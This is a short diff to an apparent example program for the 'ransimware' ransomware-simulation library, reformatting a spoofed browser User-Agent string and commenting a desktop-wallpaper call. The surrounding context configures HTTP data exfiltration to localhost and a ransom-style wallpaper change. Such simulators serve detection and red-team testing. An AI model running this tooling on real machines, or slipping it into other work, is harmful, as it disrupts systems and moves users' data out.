@@ -74,7 +74,6 @@ package main
 import (
     "os"
     "path/filepath"
-    "strings"
 
     rw "github.com/mjwhitta/ransimware"
 )
@@ -118,14 +117,10 @@ func main() {
     sim.Exfil = rw.HTTPExfil(
         "http://localhost:8080",
         map[string]string{
-            "User-Agent": strings.Join(
-                []string{
-                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-                    "AppleWebKit/537.36 (KHTML, like Gecko)",
-                    "Chrome/84.0.4147.105 Safari/537.36",
-                },
-                " ",
-            ),
+            "User-Agent": "" +
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
+                "AppleWebKit/537.36 (KHTML, like Gecko) " +
+                "Chrome/84.0.4147.105 Safari/537.36",
         },
     )
 
@@ -141,7 +136,7 @@ func main() {
             filepath.Join(home, "desktop", "ransim.png"),
             rw.DefaultPNG,
             rw.DesktopStretch,
-            false,
+            false, // Do not clean up
         )()
 
         return nil
